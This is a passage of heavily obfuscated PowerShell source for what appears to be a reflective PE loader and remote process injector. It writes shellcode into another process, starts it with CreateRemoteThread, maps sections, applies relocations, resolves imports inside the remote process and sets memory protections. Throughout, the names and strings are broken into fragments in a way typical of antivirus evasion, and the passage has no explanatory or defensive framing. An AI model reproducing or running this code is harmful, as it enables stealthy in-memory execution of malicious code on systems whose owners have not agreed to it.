            Throw ("{7}{5}{0}{4}{2}{1}{3}{8}{6}"-f'ble to ','ellcode to remote pro',' sh','cess m','write','na','ry.','U','emo')
        }
        
        ${rth`ReADHa`N`dlE} = &("{1}{0}{2}{3}{4}" -f 'te','Crea','-','Re','moteThread') -ProcessHandle ${Rem`oTEpROCh`An`DlE} -StartAddress ${RSc`Ad`dr} -Win32Functions ${w`In`32FUNCT`Io`NS}
        ${Res`U`lT} = ${wI`N32fu`NCtiO`Ns}."WaIt`F`orS`Ing`leObJE`ct"."INVO`Ke"(${rt`H`R`EAdhanDLE}, 20000)
        if (${Re`S`UlT} -ne 0)
        {
            Throw ("{14}{15}{0}{11}{8}{12}{2}{10}{7}{13}{6}{4}{9}{5}{3}{1}" -f'Cre','ed.','ad','fail','d','s ','ocA','a','eTh','dres',' to c','ateRemot','re','ll GetPr','Ca','ll to ')
        }
        
        
        [IntPtr]${r`etUR`NvaLmEM} =   ( VArIable znDo  -va )::("{2}{3}{1}{0}"-f'al','HGlob','A','lloc').Invoke(${P`TRsI`zE})
        ${RE`SuLT} = ${WIn3`2FUNcTi`ONs}."ReA`d`ProC`eSs`m`eMory"."iN`V`Oke"(${Re`m`oTE`P`RO`CHandLe}, ${GeTp`Roc`A`D`dREs`SReT`meM}, ${RETUrn`ValM`EM}, [UIntPtr][UInt64]${P`TrSi`ze}, [Ref]${nu`MbytES`WRit`TEn})
        if ((${R`esU`lT} -eq ${fAL`Se}) -or (${nUM`BytESwRi`T`TEn} -eq 0))
        {
            Throw ("{4}{0}{3}{2}{1}{5}"-f' ReadPr','y fa','cessMemor','o','Call to','iled')
        }
        [IntPtr]${p`RO`Caddre`SS} =  (DiR vARiAble:Zndo  ).vAlUe::"P`T`RTost`RUCTURe"(${R`Et`UR`NvalmeM}, [Type][IntPtr])

        
        ${Wi`N3`2FUNCt`IOnS}."VIR`TUa`LFRe`EeX"."In`VoKE"(${REMOT`Epro`C`Ha`NDLE}, ${Rs`caD`dR}, [UIntPtr][UInt64]0, ${wiN`32C`oNSTAnTS}."MEM`_RElEA`Se") | &("{1}{0}{2}"-f't','Ou','-Null')
        ${W`In32`FUN`CTions}."VIr`TualFrEE`Ex"."inv`Oke"(${R`emOTe`PrOCHa`NDLe}, ${G`ETpRo`C`A`dDreS`Sre`Tmem}, [UIntPtr][UInt64]0, ${WI`N`3`2conST`Ants}."M`EM_rE`lEaSe") | &("{2}{0}{1}"-f'Nul','l','Out-')

        if (-not ${load`By`ORdinAl})
        {
            ${W`IN32F`Unc`TIOns}."V`iRt`U`AlFReeEX"."IN`VoKe"(${Re`mot`ePROChAn`DlE}, ${rfun`CNaM`Ep`Tr}, [UIntPtr][UInt64]0, ${wIN`32c`ONs`TanTS}."M`Em`_rE`LeasE") | &("{2}{0}{1}"-f'N','ull','Out-')
        }
        
        return ${Pr`OCADd`R`ESs}
    }


    Function Co`pY`-seCt`ions
    {
        Param(
        [Parameter(pOsITIOn = 0, mandATORy = ${tr`Ue})]
        [Byte[]]
        ${pEbY`TeS},
        
        [Parameter(poSitiOn = 1, mANdAtORy = ${tr`Ue})]
        [System.Object]
        ${Pe`IN`FO},
        
        [Parameter(PoSITiOn = 2, mANDAtOry = ${t`RUe})]
        [System.Object]
        ${WIn3`2`F`UnCtIONs},
        
        [Parameter(POsiTioN = 3, MANdaTOry = ${T`Rue})]
        [System.Object]
        ${WIN`3`2tyPEs}
        )
        
        for( ${I} = 0; ${I} -lt ${peI`N`Fo}."IMAGE_nT`_`h`EAdErS"."fI`lEh`EAdEr"."NuMb`e`ROf`SEcTiOnS"; ${I}++)
        {
            [IntPtr]${SEC`T`IONH`EaDE`RPTr} = [IntPtr](&("{3}{6}{5}{1}{0}{2}{4}" -f'n','ntAsU','si','Add-','gned','gnedI','Si') ([Int64]${pE`in`Fo}."secTIo`NhEaDE`Rp`TR") (${i} *  ( gEt-VaRiAbLE Zndo -VALUe )::"siz`EOf"([Type]${WiN`32`TYpES}."imAGe_SE`cTiOn`_heAd`Er")))
            ${sectI`On`h`EadER} =  (vARIABLe  zNDo -vA )::"PtRToSTr`U`ct`URE"(${sEc`Ti`ONH`e`ADeR`PTR}, [Type]${wi`N`32Types}."I`mAg`e`_sEC`TIon_hEADER")
        
            
            [IntPtr]${sEC`T`ionde`sTAd`dr} = [IntPtr](&("{1}{2}{5}{4}{3}{0}" -f'd','Add','-Sign','Unsigne','IntAs','ed') ([Int64]${p`EinFO}."pe`H`AndlE") ([Int64]${sE`CTIOnHe`AdeR}."Vir`T`UA`LadDRESS"))
            
            
            
            
            
            ${sIZeO`FRaW`d`ATa} = ${SecTiONHE`Ad`eR}."Si`ZEoFra`w`D`AtA"

            if (${sECtIon`H`Ea`dEr}."P`oINtE`RToRAW`d`ATa" -eq 0)
            {
                ${s`izE`O`Fr`AWDaTa} = 0
            }
            
            if (${siZ`eof`R`A`wdAtA} -gt ${seC`TI`ONHe`ADeR}."vIR`TuAlsi`zE")
            {
                ${SIz`eoFr`AwdaTA} = ${S`E`ctIonHeAd`Er}."vi`R`Tual`sIZE"
            }
            
            if (${sIzE`OFr`AWdA`Ta} -gt 0)
            {
                &("{4}{0}{2}{3}{1}"-f 'ory','d','RangeVa','li','Test-Mem') -DebugString ("{0}{1}{4}{3}{2}"-f 'Copy-Secti','on','y','::MarshalCop','s') -PEInfo ${p`e`iNFo} -StartAddress ${s`Ec`TiONdesta`dDr} -Size ${SIz`eO`FrA`wDATA} | &("{2}{0}{1}"-f 'ut','-Null','O')
                 ( VARIABlE  znDO).valUE::"C`OPy"(${pe`ByteS}, [Int32]${seCTI`on`h`ea`deR}."p`oin`TE`RTORaWDATA", ${S`Ec`TIOndes`TadDR}, ${sIZ`EOFR`A`wdaTA})
            }
        
            
            if (${S`Ec`TIoNh`eAd`Er}."Siz`Eof`R`Aw`DATa" -lt ${s`E`ctiO`NheAD`Er}."VIRT`UAlSI`ze")
            {
                ${D`IFfere`NCE} = ${sEctIo`N`HEaDER}."vIrt`Ua`lSize" - ${sIZE`Of`R`AWdAta}
                [IntPtr]${stArtA`D`Dr`Ess} = [IntPtr](&("{5}{6}{3}{0}{1}{4}{2}"-f 'd','IntAsU','d','e','nsigne','A','dd-Sign') ([Int64]${S`eC`Tio`NDEStaDDr}) ([Int64]${sIzEo`FRa`wdA`Ta}))
                &("{4}{2}{3}{0}{1}"-f 'Ran','geValid','-','Memory','Test') -DebugString ("{2}{3}{0}{4}{1}" -f'-Section','t','Co','py','s::Memse') -PEInfo ${p`einFo} -StartAddress ${s`TAR`Tad`DResS} -Size ${DIf`Fe`REnCE} | &("{2}{1}{0}"-f'Null','t-','Ou')
                ${wiN3`2F`Unct`ioNS}."MEm`SeT"."iN`VoKe"(${s`TaRt`A`ddREsS}, 0, [IntPtr]${dIffE`Re`Nce}) | &("{0}{2}{1}"-f'Ou','ll','t-Nu')
            }
        }
    }


    Function UP`d`AtE-mE`Mo`RyAD`d`Resses
    {
        Param(
        [Parameter(pOSiTIon = 0, mAndatory = ${TR`UE})]
        [System.Object]
        ${Pe`INfO},
        
        [Parameter(POsItioN = 1, MaNDaToRY = ${T`RUe})]
        [Int64]
        ${O`RIG`iN`A`lImAgEbaSe},
        
        [Parameter(posITIoN = 2, mAnDAtOrY = ${tr`Ue})]
        [System.Object]
        ${win3`2COn`Stan`Ts},
        
        [Parameter(pOSITIOn = 3, MAnDAtORY = ${T`Rue})]
        [System.Object]
        ${W`i`N32TyP`eS}
        )
        
        [Int64]${BasE`D`i`Ff`ereNcE} = 0
        ${aDDdIFF`Er`en`CE} = ${TR`Ue} 
        [UInt32]${im`AGebAsEre`LocSi`zE} =  (get-vARIABle  ZnDo  -VAl )::"SIz`e`OF"([Type]${wI`N32t`ypES}."i`mage_ba`S`E_rElOcAt`IOn")
        
        
        if ((${O`RI`ginAlIMAGebA`SE} -eq [Int64]${Pei`NFO}."e`FFEcTiV`epeH`ANdlE") `
                -or (${p`ei`NfO}."Ima`g`e`_N`T_HeadERS"."oP`TI`Ona`lheaD`Er"."B`ASE`ReLo`cat`IontabLe"."sI`zE" -eq 0))
        {
            return
        }


        elseif ((&("{7}{6}{0}{2}{5}{3}{1}{4}" -f're-Val','2AsUI','1GreaterT','al','nt','hanV','pa','Com') (${OrIgInA`lim`AgE`BaSe}) (${PE`iNFO}."eF`F`eCTIvEP`EHA`Ndle")) -eq ${T`Rue})
        {
            ${bA`SedifF`eReNCE} = &("{3}{5}{4}{6}{2}{0}{1}"-f'n','ed','nsig','Sub-Si','dInt','gne','AsU') (${OR`IgIN`Ali`m`AGEB`Ase}) (${p`eiN`FO}."EFfEC`TIveP`e`hA`NDLe")
            ${adDDiFFeR`E`N`ce} = ${F`AlSe}
        }
        elseif ((&("{6}{3}{4}{2}{1}{5}{0}{8}{7}"-f 'As','T','r','r','eate','hanVal2','Compare-Val1G','t','UIn') (${pEiN`Fo}."e`FFE`cTivE`P`Eh`ANDlE") (${OR`iGinALI`m`AGeb`ASE})) -eq ${T`Rue})
        {
            ${BasEdiffeR`EN`cE} = &("{6}{3}{0}{5}{2}{4}{1}" -f't','gned','s','n','i','AsUn','Sub-SignedI') (${p`E`INFO}."effEctiv`epe`h`ANdlE") (${OrIG`iNAlImAGe`Ba`se})
        }
        
        
        [IntPtr]${baS`erel`OcPtR} = [IntPtr](&("{1}{3}{4}{6}{0}{5}{2}"-f'Un','A','ned','dd-Si','gne','sig','dIntAs') ([Int64]${pE`iN`FO}."P`eHANdlE") ([Int64]${PE`I`NFo}."I`mAGe_nT`_`heAdeRS"."Option`Al`he`Ad`ER"."BAS`eReL`ocATI`OnTab`Le"."vIRT`UA`ladDRe`SS"))
        while(${T`Rue})
        {
            
            ${b`A`sE`REloc`At`IoNT`ABLE} =  (  ChIlDITEm vArIaBlE:zNDo ).vaLue::"p`TRt`O`sTRUCTUrE"(${baserE`LOC`Ptr}, [Type]${W`In32T`YpEs}."i`ma`ge_`B`ASE_ReLoc`At`ioN")

            if (${base`REloCaTI`O`Ntab`lE}."sIzEOFB`l`Ock" -eq 0)
            {
                break
            }

            [IntPtr]${me`m`ADDRBaSE} = [IntPtr](&("{3}{0}{5}{4}{2}{1}" -f't','ed','n','Add-SignedIn','ig','AsUns') ([Int64]${Pe`IN`FO}."pE`Han`dlE") ([Int64]${BA`sEreLocaTiO`N`TABle}."vi`RTuAladdRe`SS"))
            ${NuMR`EL`o`CaTIONs} = (${ba`sERE`lo`catiONta`B`Le}."sI`Ze`Ofb`lOCK" - ${i`Mage`BASEr`e`lOCs`izE}) / 2

            
            for(${I} = 0; ${I} -lt ${nU`MrEl`o`ca`TIoNS}; ${i}++)
            {
                
                ${R`eloCatIo`N`InfOPTr} = [IntPtr](&("{5}{4}{3}{1}{2}{0}"-f'ntAsUnsigned','Si','gnedI','-','dd','A') ([IntPtr]${bA`s`Er`e`lOcpTr}) ([Int64]${imAGEBasERElO`cS`I`zE} + (2 * ${I})))
                [UInt16]${reLoc`AtiO`NInfo} =  $zNdo::"PTr`TOsT`RucTuRe"(${R`ELo`c`A`TIonInFopTR}, [Type][UInt16])

                
                [UInt16]${rE`lO`coffseT} = ${reL`OcAtI`O`Ni`NFo} -band 0x0FFF
                [UInt16]${r`e`lO`CTYpe} = ${REl`Ocati`oNINfo} -band 0xF000
                for (${J} = 0; ${j} -lt 12; ${j}++)
                {
                    ${rELOc`T`Ype} =  $R72g::("{1}{0}" -f'loor','F').Invoke(${re`lOCty`PE} / 2)
                }

                
                
                
                if ((${Re`lOCTY`Pe} -eq ${W`In32cOnSTA`N`TS}."iM`Ag`E_REL_`BaSEd`_hiGhlow") `
                        -or (${Rel`O`cty`pe} -eq ${WIn32`C`onSt`A`NTS}."IMAgE_r`eL_baS`ed`_di`R`64"))
                {           
                    
                    [IntPtr]${F`I`NAlAd`DR} = [IntPtr](&("{7}{4}{1}{2}{3}{6}{5}{0}" -f 'd','Si','gnedIntA','sUn','d-','e','sign','Ad') ([Int64]${mE`Mad`Dr`Base}) ([Int64]${rE`loCOF`FsET}))
                    [IntPtr]${CUrr`A`ddr} =   $ZNDO::"pT`RTo`stR`UctUrE"(${F`iN`ALAdDr}, [Type][IntPtr])
        
                    if (${Ad`dDI`F`F`ERenCE} -eq ${TR`UE})
                    {
                        [IntPtr]${cUR`Ra`ddr} = [IntPtr](&("{0}{1}{3}{2}"-f 'Ad','d-Sign','AsUnsigned','edInt') ([Int64]${C`UrrA`dDR}) (${B`ASe`D`iFF`EREnce}))
                    }
                    else
                    {
                        [IntPtr]${C`URR`ADdR} = [IntPtr](&("{3}{2}{6}{1}{5}{0}{4}" -f'AsUnsign','I','ub-','S','ed','nt','Signed') ([Int64]${c`UR`RAddr}) (${BAsEDIf`FeREn`CE}))
                    }               

                     (  gcI VarIABle:ZNDO).vALUE::("{2}{3}{0}{1}" -f 'tureTo','Ptr','St','ruc').Invoke(${C`UR`RAd`dR}, ${fi`NalAD`DR}, ${FAL`Se}) | &("{2}{1}{0}" -f 'll','-Nu','Out')
                }
                elseif (${rE`LOCTy`pe} -ne ${wI`N32conS`T`A`NTS}."ImAge`_REL_`BasEd_aBS`oL`Ute")
                {
                    
                    Throw ('Unknown'+' '+'relo'+'ca'+'t'+'ion '+'f'+'ound,'+' '+'reloc'+'ati'+'on '+'v'+'alue'+': '+"$RelocType, "+'re'+'lo'+'cationinf'+'o:'+' '+"$RelocationInfo")
                }
            }
            
            ${BaS`eR`eL`OCPTR} = [IntPtr](&("{4}{0}{1}{3}{2}" -f 'dd-SignedInt','AsU','igned','ns','A') ([Int64]${bAs`ErelO`cpTr}) ([Int64]${bAS`eRE`LOcATi`ON`TabLe}."Si`ZE`OFblOCk"))
        }
    }


    Function I`MPORT-DLLi`mP`Orts
    {
        Param(
        [Parameter(POsItion = 0, mAnDaTORY = ${Tr`Ue})]
        [System.Object]
        ${Pei`NfO},
        
        [Parameter(pOsItION = 1, MandAToRy = ${tr`Ue})]
        [System.Object]
        ${W`in3`2F`UnctIoNS},
        
        [Parameter(positiOn = 2, mandATORy = ${Tr`UE})]
        [System.Object]
        ${WI`N32`Ty`peS},
        
        [Parameter(poSitioN = 3, MaNDAtoRy = ${t`Rue})]
        [System.Object]
        ${wi`N3`2con`s`TANtS},
        
        [Parameter(pOSitIoN = 4, MandaTORY = ${f`A`lse})]
        [IntPtr]
        ${REMoTEP`RO`cha`N`DlE}
        )
        
        ${reMo`Tel`OaD`InG} = ${fAl`Se}
        if (${pE`InFO}."PEhA`ND`le" -ne ${pei`NFO}."E`FfE`CTiVepE`h`AnD`Le")
        {
            ${R`eMotelOadi`NG} = ${t`RuE}
        }
        
        if (${pE`iN`Fo}."im`AgE_N`T_HEA`DeRs"."o`pTIona`LH`eA`deR"."iMPoRtt`A`BLe"."si`zE" -gt 0)
        {
            [IntPtr]${I`M`p`Or`TdE`sc`RIptOrPTR} = &("{1}{4}{0}{2}{5}{3}{6}" -f 'nedInt','Add-Si','A','n','g','sUnsig','ed') ([Int64]${pEiN`FO}."PE`HANdlE") ([Int64]${P`eIn`Fo}."iMa`g`E_n`T_HEaD`ers"."opt`iona`LHea`der"."IMpoRt`Tab`lE"."v`I`RTUaLadDRe`ss")
            
            while (${T`RuE})
            {
                ${imPO`Rtd`e`sCrIPtOR} =   ( gCI  vAriAblE:zndO ).ValuE::"ptrtOs`T`RUCtu`RE"(${IMPO`Rtdesc`R`iptOR`Ptr}, [Type]${wIn3`2T`ypES}."iM`Age_impOR`T`_d`Es`CripToR")
                
                
                if (${imPo`RTDEs`crIpt`or}."ChaRACT`e`Ri`sTicS" -eq 0 `
                        -and ${IMP`ort`dEsc`R`IpTor}."Fi`RS`TthUnK" -eq 0 `
                        -and ${IMporTdEs`CRI`Pt`or}."foRW`A`RDERCH`Ain" -eq 0 `
                        -and ${imP`O`RTDeSC`RIptor}."na`me" -eq 0 `
                        -and ${impORTd`E`SCr`IptOR}."TImE`da`TEst`A`MP" -eq 0)
                {
                    &("{3}{1}{0}{2}"-f'-Verbos','rite','e','W') ("{1}{2}{5}{3}{6}{7}{0}{8}{4}" -f'p','Done ','im','r','ts','po','ting DLL',' im','or')
                    break
                }

                ${i`m`POrtD`LLhAn`dLE} =   (  gcI  ("vARi"+"ablE:pef"+"z6"+"J")  ).VaLue::"ZE`RO"
                ${Im`poRTd`Ll`PathP`Tr} = (&("{4}{5}{3}{6}{2}{1}{0}"-f 'd','gne','i','nedIntAsUn','Ad','d-Sig','s') ([Int64]${p`ein`Fo}."P`eHanDLe") ([Int64]${iM`pORT`DeScRi`pToR}."nA`Me"))
                ${I`mpo`R`TdllPAtH} =   $zndO::("{3}{1}{2}{0}" -f'si','trToSt','ringAn','P').Invoke(${ImpoRtDl`L`Pa`T`HpTR})
                
                if (${r`Em`otelOADi`Ng} -eq ${TR`UE})
                {
                    ${IMPo`RtDLlhAnd`LE} = &("{7}{4}{6}{1}{5}{3}{2}{0}" -f'ess','llInRemo','Proc','e','rt-','t','D','Impo') -RemoteProcHandle ${Re`m`OtEP`R`oChA`NdLe} -ImportDllPathPtr ${I`mPor`T`Dl`LPA`ThPtr}
                }
                else
                {
                    ${IM`poRt`dlLH`ANdLE} = ${wI`N32`FuNCT`Io`NS}."L`OadlibrA`Ry"."In`VOKE"(${i`mPO`Rt`dLlPATh})
                }

                if ((${imPorT`DlL`H`A`ND`le} -eq ${nU`LL}) -or (${Im`poR`TdLlhaNDLe} -eq   (  iTEm  vaRiabLe:peFz6J  ).value::"zE`Ro"))
                {
                    throw ('Error'+' '+'im'+'porting'+' '+'DL'+'L, '+'DLL'+'Name'+': '+"$ImportDllPath")
                }
                
                
                [IntPtr]${th`U`NKrEf} = &("{3}{0}{7}{5}{4}{1}{2}{6}"-f 'd','ntAsU','nsigne','Ad','nedI','Sig','d','-') (${pe`In`FO}."peH`AnDlE") (${iMpoRTdES`crI`P`T`oR}."F`IRST`Th`UNk")
                [IntPtr]${Or`Igin`Alth`UnK`R`EF} = &("{4}{1}{2}{5}{3}{6}{0}" -f 'd','dd-Signed','Int','i','A','AsUns','gne') (${PEI`NfO}."peH`AN`dlE") (${iMpORtdE`sC`R`I`ptOR}."Cha`R`AcTErI`STicS") 
                [IntPtr]${oRI`g`INaL`THUnkre`Fv`AL} =  $ZNDO::"pTRt`OsT`RuCT`Ure"(${oRi`g`In`A`ltHUnkreF}, [Type][IntPtr])
                
                while (${orIginA`L`Th`Un`Kre`FVaL} -ne   ( gET-ItEm VariAblE:pefZ6j  ).VaLUE::"Z`ero")
                {
                    ${l`oa`DbyOrDinaL} = ${FAL`se}
                    [IntPtr]${pro`CEdURE`NamE`PTr} =   (  gEt-chIldITeM  vaRIAblE:PEfZ6j).vALUe::"ze`RO"
                    
                    
                    
                    [IntPtr]${NEw`T`HUnKref} =  (Get-vAriAbLE  ('PEf'+'Z6J') ).ValUE::"Ze`Ro"
                    if( $ZndO::"s`IZeoF"([Type][IntPtr]) -eq 4 -and [Int32]${OR`iG`inaL`TH`UnkreFVAL} -lt 0)
                    {
                        [IntPtr]${pR`o`Ce`DurENamEPtr} = [IntPtr]${O`RIGInaL`TH`UNkrEfV`AL} -band 0xffff 
                        ${LoaDBYO`RD`in`AL} = ${TR`Ue}
                    }
                    elseif(  (gci  VArIABLe:zNDo  ).VALUE::"siZ`EoF"([Type][IntPtr]) -eq 8 -and [Int64]${orIgi`Nal`T`hUN`k`ReFvAl} -lt 0)
                    {
                        [IntPtr]${P`RocEdUrEna`MeP`Tr} = [Int64]${OriGin`AltHuNKr`EFv`Al} -band 0xffff 
                        ${loadbyOrD`i`N`AL} = ${T`RUe}
                    }
                    else
                    {
                        [IntPtr]${sT`Ri`N`gADDr} = &("{1}{3}{2}{0}"-f 'gned','Add-Si','Unsi','gnedIntAs') (${PE`inFO}."PEHA`Nd`Le") (${ORIG`IN`AL`T`hUN`KREfvAL})
                        ${St`Ring`ADDR} = &("{2}{1}{3}{4}{0}" -f'd','d-Sign','Ad','edIntAsUns','igne') ${sTRIN`GaD`dR} ( ( ITEM  ('VA'+'riA'+'bLe'+':ZnD'+'O')).ValUe::"siZ`Eof"([Type][UInt16]))
                        ${pR`ocE`duRENaME} =  ( GEt-vArIABle  ZndO  -va)::("{2}{1}{0}{3}"-f 'i','tr','PtrToS','ngAnsi').Invoke(${str`IngA`d`DR})
                        ${PrO`CEDuREnAm`E`pTr} =  ( VAriAble znDO  ).VALUE::("{3}{2}{0}{5}{1}{4}"-f 'ToHG','n','ring','St','si','lobalA').Invoke(${PR`o`C`EduREN`AMe})
                    }
                    
                    if (${REM`oTE`loA`Di`NG} -eq ${tR`Ue})
                    {
                        [IntPtr]${NEWtH`U`N`KrEF} = &("{0}{3}{4}{2}{1}" -f'Ge','s','dres','t-Rem','oteProcAd') -RemoteProcHandle ${rEm`O`Tep`R`o`chandLe} -RemoteDllHandle ${i`mpoR`TdlL`ha`NdLE} -FunctionNamePtr ${PrO`CEDU`ReNaMe`p`TR} -LoadByOrdinal ${lo`AdbyOrdin`Al}
                    }
                    else
                    {
                        [IntPtr]${newT`HUNkR`ef} = ${w`IN3`2fUnC`T`ioNS}."GET`pROcA`d`dReS`sinTptr"."iNV`oke"(${I`MPoRt`dLL`hAnD`Le}, ${pr`oCe`Du`Rena`m`ePTR})
                    }
                    
                    if (${nEWt`hU`NKreF} -eq ${nU`Ll} -or ${newtHu`NK`ReF} -eq   $pefZ6j::"Z`ERO")
                    {
                        if (${loa`dB`YOrdi`N`AL})
                        {
                            Throw ('New'+' '+'function'+' '+'ref'+'ere'+'nce '+'is'+' '+'nul'+'l,'+' '+'th'+'is '+'i'+'s '+'almo'+'st '+'certa'+'inly'+' '+'a '+'bu'+'g '+'in'+' '+'this'+' '+'scri'+'pt'+'. '+'Func'+'tion '+'O'+'r'+'dinal: '+"$ProcedureNamePtr. "+'Dl'+'l: '+"$ImportDllPath")
                        }
                        else
                        {
                            Throw ('New'+' '+'f'+'unctio'+'n '+'refe'+'ren'+'ce '+'i'+'s '+'n'+'ull,'+' '+'t'+'his '+'is'+' '+'a'+'lm'+'ost '+'certain'+'ly'+' '+'a '+'bug'+' '+'in'+' '+'thi'+'s '+'scri'+'pt.'+' '+'F'+'unctio'+'n: '+"$ProcedureName. "+'D'+'ll: '+"$ImportDllPath")
                        }
                    }

                     (ITem VaRIABLe:ZndO).vAlue::("{3}{1}{0}{2}"-f'oPt','eT','r','Structur').Invoke(${N`ewThUn`k`ReF}, ${Thu`NKRef}, ${FA`lse})
                    
                    ${t`H`Unkr`EF} = &("{0}{1}{4}{2}{3}" -f'Add-S','ig','tAsUnsigne','d','nedIn') ([Int64]${T`HUN`kRef}) (  ( gCI  VaRIAblE:ZnDO ).VALue::"s`I`zEof"([Type][IntPtr]))
                    [IntPtr]${ORig`in`ALtHun`krEf} = &("{0}{1}{7}{5}{3}{2}{6}{4}" -f'Add','-Si','Uns','IntAs','gned','d','i','gne') ([Int64]${or`Ig`inALT`hUnK`Ref}) (  $ZNdO::"Si`ZEOF"([Type][IntPtr]))
                    [IntPtr]${O`Ri`G`INaLT`HunKRE`FVal} =  $zNdO::"p`TrToS`T`Ru`cture"(${Ori`gi`NALTHun`K`Ref}, [Type][IntPtr])

                    
                    
                    if ((-not ${Loa`DbYo`Rdi`NAL}) -and (${P`RoC`Edure`NaME`ptr} -ne   (gET-vARiAblE PeFz6j -VaLUEonL  )::"ze`RO"))
                    {
                         $ZnDo::("{3}{1}{2}{0}"-f 'al','eHGl','ob','Fre').Invoke(${P`Roce`D`UrenAMEPtr})
                        ${p`R`OC`edureNa`MEpTr} =  (gEt-IteM  varIABLe:peFZ6J  ).VALue::"ZE`Ro"
                    }
                }
                
                ${iMPOR`TdEsC`RI`pT`OrptR} = &("{3}{2}{1}{0}{4}"-f'ig','s','-SignedIntAsUn','Add','ned') (${ImPO`RtD`EsC`RipTO`RPtr}) (  $ZndO::"Siz`eoF"([Type]${WI`N32`T`YPES}."imaGe`_i`m`pOr`T_DeS`CRipT`or"))
            }
        }
    }

    Function GeT-V`i`RT`UalpRotEctValue
    {
        Param(
        [Parameter(poSITION = 0, MandaTOry = ${T`RuE})]
        [UInt32]
        ${se`CTIO`N`cH`A`RacTeris`TICs}
        )
        
        ${Prot`ECt`iON`Flag} = 0x0
        if ((${S`E`CtioNchAraCtEr`iS`Tics} -band ${win32c`ONs`Ta`NTs}."i`magE_`SC`N_Mem_eXe`c`Ute") -gt 0)
        {
            if ((${se`C`TIOnch`AR`ACt`EriS`TIcS} -band ${Win`3`2Co`NStAN`TS}."iMagE_SCn`_me`m`_r`eAD") -gt 0)
            {
                if ((${SE`ctioNCHaRa`Ct`E`R`iS`Ti`CS} -band ${Win32`C`O`NSTA`Nts}."i`M`Age_Scn_mE`m`_`WRite") -gt 0)
                {
                    ${Pr`Ot`e`c`TIonflag} = ${WIn`3`2CONS`Ta`NTS}."p`A`g`E_exEC`UtE_ReadWRI`Te"
                }
                else
                {
                    ${p`RoT`ec`TIoNFL`AG} = ${WIn3`2conStA`NTs}."PAGe_`Exec`UTe_`READ"
                }
            }
            else
            {
                if ((${S`E`ct`IoNch`ARaCT`Erist`iCS} -band ${WIN`32Co`N`S`TanTS}."I`MAge_sCN_`Mem_`w`RitE") -gt 0)
                {
                    ${pr`OtE`Ct`i`oNFlag} = ${WI`N32C`OnSTa`NTS}."pAGE`_eXecUtE`_Wri`T`e`c`Opy"
                }
                else
                {
                    ${PrO`T`Ec`TIO`Nflag} = ${W`In32co`Nst`An`TS}."P`AGE_e`xec`Ute"
                }
            }
        }
        else
        {
            if ((${s`ECTIo`NCH`Ar`ACTErIS`TICS} -band ${W`I`N32cO`NStaNts}."im`Ag`E_sC`N_MEm_ReAD") -gt 0)
            {
                if ((${S`ECT`iO`NCHaRac`TERISTics} -band ${WI`N32`C`oNstantS}."IMaGE_sC`N`_me`m_wRIte") -gt 0)
                {
                    ${PrO`TE`ctIO`N`FLAG} = ${WI`N32`C`Ons`TANts}."paG`e_reA`Dw`Ri`TE"
                }
                else
                {
                    ${prO`Te`c`TIonfLAG} = ${WiN32`ConST`ANtS}."Pag`e_reA`do`NlY"
                }
            }
            else
            {
                if ((${secTioNCh`A`RAc`TE`RiStics} -band ${W`in`32Const`An`Ts}."IMA`Ge_sCN_`m`Em`_`wRIte") -gt 0)
                {
                    ${p`R`oTEcti`ONflag} = ${W`IN32`c`oNStaNts}."p`AGe_WrITe`CO`pY"
                }
                else
                {
                    ${prOtect`I`ON`F`Lag} = ${WIN3`2CONS`Ta`NTS}."P`Ag`E_NOA`CCesS"
                }
            }
        }
        
        if ((${S`ec`TiOnch`ARAcTe`RistI`Cs} -band ${wiN`32`CONstAn`TS}."im`AGE_`S`Cn_mEm_not_cACH`ed") -gt 0)
        {
            ${Pr`otEC`TiONFL`AG} = ${pR`OTe`CT`IOn`FlAG} -bor ${w`in32CoN`st`An`TS}."p`AgE_NOc`AChE"
        }
        
        return ${pRO`T`eCTIo`NflAg}
    }

    Function uPdAt`E-M`emO`R`YpRoTEC`TIONflaGS
    {
        Param(
        [Parameter(POsITIOn = 0, MaNdaTOrY = ${T`RUE})]
        [System.Object]
        ${Pe`I`NFO},
        
        [Parameter(POSITion = 1, MaNDAtOry = ${tR`Ue})]
        [System.Object]
        ${win`32f`UN`ctiOnS},
        
        [Parameter(poSItIon = 2, mANDatORY = ${tR`UE})]
        [System.Object]
        ${wiN3`2Co`NSt`A`Nts},
        
        [Parameter(POSitiOn = 3, MANDAtORY = ${t`RUE})]
        [System.Object]
        ${wiN32T`yp`ES}
        )
        
        for( ${I} = 0; ${i} -lt ${PE`IN`Fo}."I`maGE_NT_H`E`Ade`RS"."fILeH`e`AdER"."n`Um`Be`RoFsectio`Ns"; ${I}++)
        {
            [IntPtr]${SEC`T`ioN`hEAde`RPTr} = [IntPtr](&("{0}{2}{4}{1}{3}"-f'Add-SignedIn','si','t','gned','AsUn') ([Int64]${pEI`Nfo}."sec`TION`hE`AD`eRPTR") (${i} *   $zNdO::"siZe`OF"([Type]${wi`N32ty`p`Es}."ima`GE_s`eCTION_`h`Eader")))
            ${SEc`TIo`NH`eaD`ER} =   $ZNdO::"PtRtOs`TR`UcTURE"(${se`CTioNHea`d`Er`PTr}, [Type]${w`in3`2`TYPES}."IMage_sECTIoN_`h`E`AdEr")
            [IntPtr]${s`ecTi`o`NpTr} = &("{2}{4}{5}{1}{3}{0}"-f'AsUnsigned','In','Add-S','t','ig','ned') (${P`EInFo}."pE`H`AndLe") (${SeCT`i`ON`HEaDER}."virTuAlA`d`DreSS")
            
            [UInt32]${prO`TEcTFL`Ag} = &("{5}{6}{4}{2}{1}{0}{3}" -f'ectV','rot','tualP','alue','ir','Get','-V') ${SEctI`o`NHe`ADer}."ChARac`Teri`s`T`ICS"
            [UInt32]${s`ECTIons`i`ze} = ${sE`CTio`NHE`ADEr}."v`iRT`UALs`izE"
            
            [UInt32]${O`Ld`proteC`TfL`Ag} = 0
            &("{3}{4}{2}{5}{0}{1}"-f 'Val','id','mory','Te','st-Me','Range') -DebugString ("{4}{9}{10}{11}{1}{6}{7}{3}{2}{8}{12}{5}{0}" -f'ct','nF','irt',':V','Update-Memor','Prote','l','ags:','u','yPr','otecti','o','al') -PEInfo ${pEIn`FO} -StartAddress ${sect`i`oNP`TR} -Size ${Sec`T`i`OnsIzE} | &("{0}{1}"-f'Out-Nu','ll')
            ${S`UCce`ss} = ${wiN`32Fun`C`TIOns}."VirtUalPr`O`TE`ct"."Inv`o`KE"(${S`ectiO`N`pTR}, ${S`EcTIONSI`ZE}, ${P`RoTECtf`LAg}, [Ref]${OLDproTec`TFL`Ag})
            if (${s`UcceSS} -eq ${f`A`lse})
            {
